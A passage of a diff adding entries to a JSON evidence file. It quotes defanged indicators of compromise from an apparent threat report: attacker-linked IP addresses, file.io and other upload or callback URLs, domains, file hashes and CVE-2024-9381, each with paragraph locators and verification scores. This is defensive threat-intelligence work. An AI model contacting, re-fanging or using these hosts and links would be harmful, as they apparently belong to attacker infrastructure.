+  },
+  {
+   "id": "evidence-74",
+   "quote": "107.173.89[.]16",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "107.173.89[.]16"
+  },
+  {
+   "id": "evidence-75",
+   "quote": "107.173.89[.]16",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "43"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "107.173.89[.]16"
+  },
+  {
+   "id": "evidence-76",
+   "quote": "107.173.89[.]16",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "122"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "107.173.89[.]16"
+  },
+  {
+   "id": "evidence-77",
+   "quote": "reports[.]php",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "reports[.]php"
+  },
+  {
+   "id": "evidence-78",
+   "quote": "142.171.217[.]195",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "22"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "142.171.217[.]195"
+  },
+  {
+   "id": "evidence-79",
+   "quote": "142.171.217[.]195",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "36"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "142.171.217[.]195"
+  },
+  {
+   "id": "evidence-80",
+   "quote": "142.171.217[.]195",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "40"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "142.171.217[.]195"
+  },
+  {
+   "id": "evidence-81",
+   "quote": "142.171.217[.]195",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "45"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "142.171.217[.]195"
+  },
+  {
+   "id": "evidence-82",
+   "quote": "142.171.217[.]195",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "53"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "142.171.217[.]195"
+  },
+  {
+   "id": "evidence-83",
+   "quote": "142.171.217[.]195",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "56"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "142.171.217[.]195"
+  },
+  {
+   "id": "evidence-84",
+   "quote": "142.171.217[.]195",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "63"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "142.171.217[.]195"
+  },
+  {
+   "id": "evidence-85",
+   "quote": "142.171.217[.]195",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "121"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "142.171.217[.]195"
+  },
+  {
+   "id": "evidence-86",
+   "quote": "154.64.226[.]166",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "23"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "154.64.226[.]166"
+  },
+  {
+   "id": "evidence-87",
+   "quote": "154.64.226[.]166",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "46"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "154.64.226[.]166"
+  },
+  {
+   "id": "evidence-88",
+   "quote": "216.131.75[.]53",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "24"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "216.131.75[.]53"
+  },
+  {
+   "id": "evidence-89",
+   "quote": "216.131.75[.]53",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "48"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "216.131.75[.]53"
+  },
+  {
+   "id": "evidence-90",
+   "quote": "216.131.75[.]53",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "66"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "216.131.75[.]53"
+  },
+  {
+   "id": "evidence-91",
+   "quote": "216.131.75[.]53",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "126"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "216.131.75[.]53"
+  },
+  {
+   "id": "evidence-92",
+   "quote": "23.236.66[.]97",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "25"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "23.236.66[.]97"
+  },
+  {
+   "id": "evidence-93",
+   "quote": "23.236.66[.]97",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "50"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "23.236.66[.]97"
+  },
+  {
+   "id": "evidence-94",
+   "quote": "23.236.66[.]97",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "68"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "23.236.66[.]97"
+  },
+  {
+   "id": "evidence-95",
+   "quote": "23.236.66[.]97",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "127"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "23.236.66[.]97"
+  },
+  {
+   "id": "evidence-96",
+   "quote": "38.207.159[.]76",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "26"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "38.207.159[.]76"
+  },
+  {
+   "id": "evidence-97",
+   "quote": "38.207.159[.]76",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "38.207.159[.]76"
+  },
+  {
+   "id": "evidence-98",
+   "quote": "149.154.167[.]41",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "29"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "149.154.167[.]41"
+  },
+  {
+   "id": "evidence-99",
+   "quote": "95.161.76[.]100",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "30"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "95.161.76[.]100"
+  },
+  {
+   "id": "evidence-100",
+   "quote": "95.161.76[.]100",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "52"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "95.161.76[.]100"
+  },
+  {
+   "id": "evidence-101",
+   "quote": "hxxps://file.io/E50vtqmJP5aa",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "31"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxps://file.io/E50vtqmJP5aa"
+  },
+  {
+   "id": "evidence-102",
+   "quote": "hxxps://file.io/E50vtqmJP5aa",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "84"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxps://file.io/E50vtqmJP5aa"
+  },
+  {
+   "id": "evidence-103",
+   "quote": "file.io",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "31"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "file.io"
+  },
+  {
+   "id": "evidence-104",
+   "quote": "file.io",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "32"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "file.io"
+  },
+  {
+   "id": "evidence-105",
+   "quote": "file.io",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "33"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "file.io"
+  },
+  {
+   "id": "evidence-106",
+   "quote": "file.io",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "84"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "file.io"
+  },
+  {
+   "id": "evidence-107",
+   "quote": "file.io",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "85"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "file.io"
+  },
+  {
+   "id": "evidence-108",
+   "quote": "file.io",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "86"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "file.io"
+  },
+  {
+   "id": "evidence-109",
+   "quote": "hxxps://file.io/RBKuU8gicWt",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "32"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxps://file.io/RBKuU8gicWt"
+  },
+  {
+   "id": "evidence-110",
+   "quote": "hxxps://file.io/RBKuU8gicWt",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "85"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxps://file.io/RBKuU8gicWt"
+  },
+  {
+   "id": "evidence-111",
+   "quote": "hxxps://file.io/frdZ9L18R7Nx",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "33"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxps://file.io/frdZ9L18R7Nx"
+  },
+  {
+   "id": "evidence-112",
+   "quote": "hxxps://file.io/frdZ9L18R7Nx",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "86"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxps://file.io/frdZ9L18R7Nx"
+  },
+  {
+   "id": "evidence-113",
+   "quote": "hxxp://ip.sb",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "34"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxp://ip.sb"
+  },
+  {
+   "id": "evidence-114",
+   "quote": "hxxp://ip.sb",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "87"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxp://ip.sb"
+  },
+  {
+   "id": "evidence-115",
+   "quote": "ip.sb",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "34"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ip.sb"
+  },
+  {
+   "id": "evidence-116",
+   "quote": "ip.sb",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "87"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ip.sb"
+  },
+  {
+   "id": "evidence-117",
+   "quote": "hxxps://pan.xj.hk/d/",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "35"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxps://pan.xj.hk/d/"
+  },
+  {
+   "id": "evidence-118",
+   "quote": "hxxps://pan.xj.hk/d/",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "88"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "hxxps://pan.xj.hk/d/"
+  },
+  {
+   "id": "evidence-119",
+   "quote": "pan.xj.hk",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "35"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "pan.xj.hk"
+  },
+  {
+   "id": "evidence-120",
+   "quote": "pan.xj.hk",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "88"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "pan.xj.hk"
+  },
+  {
+   "id": "evidence-121",
+   "quote": "6401646e701f5f47518ecef48a308a36",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "35"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "6401646e701f5f47518ecef48a308a36"
+  },
+  {
+   "id": "evidence-122",
+   "quote": "6401646e701f5f47518ecef48a308a36",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "88"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "6401646e701f5f47518ecef48a308a36"
+  },
+  {
+   "id": "evidence-123",
+   "quote": "108.174.199[.]200",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "37"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "108.174.199[.]200"
+  },
+  {
+   "id": "evidence-124",
+   "quote": "108.174.199[.]200",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "39"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "108.174.199[.]200"
+  },
+  {
+   "id": "evidence-125",
+   "quote": "108.174.199[.]200",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "54"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "108.174.199[.]200"
+  },
+  {
+   "id": "evidence-126",
+   "quote": "206.189.156[.]69",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "38"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "206.189.156[.]69"
+  },
+  {
+   "id": "evidence-127",
+   "quote": "206.189.156[.]69",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "55"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "206.189.156[.]69"
+  },
+  {
+   "id": "evidence-128",
+   "quote": "156.234.193[.]18",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "47"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "156.234.193[.]18"
+  },
+  {
+   "id": "evidence-129",
+   "quote": "205.169.39[.]11",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "49"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "205.169.39[.]11"
+  },
+  {
+   "id": "evidence-130",
+   "quote": "149.154.176[.]41",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "51"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "149.154.176[.]41"
+  },
+  {
+   "id": "evidence-131",
+   "quote": "67.217.228[.]83",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "57"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "67.217.228[.]83"
+  },
+  {
+   "id": "evidence-132",
+   "quote": "203.160.72[.]174",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "58"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "203.160.72[.]174"
+  },
+  {
+   "id": "evidence-133",
+   "quote": "142.11.217[.]3",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "59"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "142.11.217[.]3"
+  },
+  {
+   "id": "evidence-134",
+   "quote": "104.168.133[.]228",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "60"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "104.168.133[.]228"
+  },
+  {
+   "id": "evidence-135",
+   "quote": "64.176.49[.]160",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "61"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "64.176.49[.]160"
+  },
+  {
+   "id": "evidence-136",
+   "quote": "64.176.49[.]160",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "142"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "64.176.49[.]160"
+  },
+  {
+   "id": "evidence-137",
+   "quote": "45.141.215[.]17",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "62"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "45.141.215[.]17"
+  },
+  {
+   "id": "evidence-138",
+   "quote": "98.101.25[.]30",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "64"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "98.101.25[.]30"
+  },
+  {
+   "id": "evidence-139",
+   "quote": "134.195.90[.]71",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "67"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "134.195.90[.]71"
+  },
+  {
+   "id": "evidence-140",
+   "quote": "a50660fb31df96b3328640fdfbeea755",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "69"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "a50660fb31df96b3328640fdfbeea755"
+  },
+  {
+   "id": "evidence-141",
+   "quote": "698a752ec1ca43237cb1dc791700afde",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "71"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "698a752ec1ca43237cb1dc791700afde"
+  },
+  {
+   "id": "evidence-142",
+   "quote": "aa69300617faab4eb39b789ebfeb5abe",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "72"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "aa69300617faab4eb39b789ebfeb5abe"
+  },
+  {
+   "id": "evidence-143",
+   "quote": "c2becc553b96ba27d60265d07ec3bd6c",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "73"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "c2becc553b96ba27d60265d07ec3bd6c"
+  },
+  {
+   "id": "evidence-144",
+   "quote": "c7d20ca6fe596009afaeb725fec8635f",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "74"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "c7d20ca6fe596009afaeb725fec8635f"
+  },
+  {
+   "id": "evidence-145",
+   "quote": "cacc30e2a5b2683e19e45dc4f191cebc",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "75"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cacc30e2a5b2683e19e45dc4f191cebc"
+  },
+  {
+   "id": "evidence-146",
+   "quote": "62a611f0f1a418876b11c9df3b56885b",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "77"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "62a611f0f1a418876b11c9df3b56885b"
+  },
+  {
+   "id": "evidence-147",
+   "quote": "30f57e14596f1bcad7cc4284d1af4684",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "82"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "30f57e14596f1bcad7cc4284d1af4684"
+  },
+  {
+   "id": "evidence-148",
+   "quote": "ast[.]fun",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "92"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ast[.]fun"
+  },
+  {
+   "id": "evidence-149",
+   "quote": "ast[.]fun",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "93"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ast[.]fun"
+  },
+  {
+   "id": "evidence-150",
+   "quote": "gg.oyr2ohrm.eyes[.]sh",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "94"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "gg.oyr2ohrm.eyes[.]sh"
+  },
+  {
+   "id": "evidence-151",
+   "quote": "ggg.oyr2ohrm.eyes[.]sh",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "95"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ggg.oyr2ohrm.eyes[.]sh"
+  },
+  {
+   "id": "evidence-152",
+   "quote": "gggg.oyr2ohrm.eyes[.]sh",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "96"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "gggg.oyr2ohrm.eyes[.]sh"
+  },
+  {
+   "id": "evidence-153",
+   "quote": "txt.xj[.]hk",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "97"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "txt.xj[.]hk"
+  },
+  {
+   "id": "evidence-154",
+   "quote": "book.hacktricks[.]xyz",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "98"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "book.hacktricks[.]xyz"
+  },
+  {
+   "id": "evidence-155",
+   "quote": "https://file[.]io/1zqvMYY1dpkk",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "100"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "https://file[.]io/1zqvMYY1dpkk"
+  },
+  {
+   "id": "evidence-156",
+   "quote": "file[.]io",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "100"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "file[.]io"
+  },
+  {
+   "id": "evidence-157",
+   "quote": "d13f71e51b38ffef6b9dc8efbed27615",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "106"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "d13f71e51b38ffef6b9dc8efbed27615"
+  },
+  {
+   "id": "evidence-158",
+   "quote": "d88bfac2b43509abdc70308bef75e2a6",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "107"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "d88bfac2b43509abdc70308bef75e2a6"
+  },
+  {
+   "id": "evidence-159",
+   "quote": "d88bfac2b43509abdc70308bef75e2a6",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "110"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "d88bfac2b43509abdc70308bef75e2a6"
+  },
+  {
+   "id": "evidence-160",
+   "quote": "60d5648d35bacf5c7aa713b2a0d267d3",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "108"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "60d5648d35bacf5c7aa713b2a0d267d3"
+  },
+  {
+   "id": "evidence-161",
+   "quote": "f82847bccb621e6822a3947bc9ce9621",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "111"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "f82847bccb621e6822a3947bc9ce9621"
+  },
+  {
+   "id": "evidence-162",
+   "quote": "c894f55c8fa9d92e2dd2c78172cff745",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "112"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "c894f55c8fa9d92e2dd2c78172cff745"
+  },
+  {
+   "id": "evidence-163",
+   "quote": "192.42.116[.]210",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "192.42.116[.]210"
+  },
+  {
+   "id": "evidence-164",
+   "quote": "82.197.182[.]161",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "124"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "82.197.182[.]161"
+  },
+  {
+   "id": "evidence-165",
+   "quote": "154.213.185[.]230",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "125"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "154.213.185[.]230"
+  },
+  {
+   "id": "evidence-166",
+   "quote": "208.105.190[.]170",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "128"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "208.105.190[.]170"
+  },
+  {
+   "id": "evidence-167",
+   "quote": "136.144.17[.]145",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "129"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "136.144.17[.]145"
+  },
+  {
+   "id": "evidence-168",
+   "quote": "136.144.17[.]133",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "130"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "136.144.17[.]133"
+  },
+  {
+   "id": "evidence-169",
+   "quote": "216.73.162[.]56",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "131"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "216.73.162[.]56"
+  },
+  {
+   "id": "evidence-170",
+   "quote": "104.28.240[.]123",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "132"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "104.28.240[.]123"
+  },
+  {
+   "id": "evidence-171",
+   "quote": "163.5.171[.]49",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "133"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "163.5.171[.]49"
+  },
+  {
+   "id": "evidence-172",
+   "quote": "163.5.171[.]49",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "135"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "163.5.171[.]49"
+  },
+  {
+   "id": "evidence-173",
+   "quote": "89.187.178[.]179",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "134"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "89.187.178[.]179"
+  },
+  {
+   "id": "evidence-174",
+   "quote": "203.160.86[.]69",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "136"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "203.160.86[.]69"
+  },
+  {
+   "id": "evidence-175",
+   "quote": "185.220.69[.]83",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "138"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "185.220.69[.]83"
+  },
+  {
+   "id": "evidence-176",
+   "quote": "185.199.103[.]196",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "139"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "185.199.103[.]196"
+  },
+  {
+   "id": "evidence-177",
+   "quote": "188.172.229[.]15",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "140"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "188.172.229[.]15"
+  },
+  {
+   "id": "evidence-178",
+   "quote": "155.138.215[.]144",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "141"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "155.138.215[.]144"
+  },
+  {
+   "id": "evidence-179",
+   "quote": "185.40.4[.]38",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "143"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "185.40.4[.]38"
+  },
+  {
+   "id": "evidence-180",
+   "quote": "216.131[.]75.53",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "144"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "216.131[.]75.53"
+  },
+  {
+   "id": "evidence-181",
+   "quote": "185.40.4[.]95",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "145"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "185.40.4[.]95"
+  },
+  {
+   "id": "evidence-182",
+   "quote": "CVE-2024-9381",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "185"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9381"
+  },
+  {
+   "id": "evidence-183",
+   "quote": "gggg.oyr2ohrm.eyes.sh",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "219"
+   },
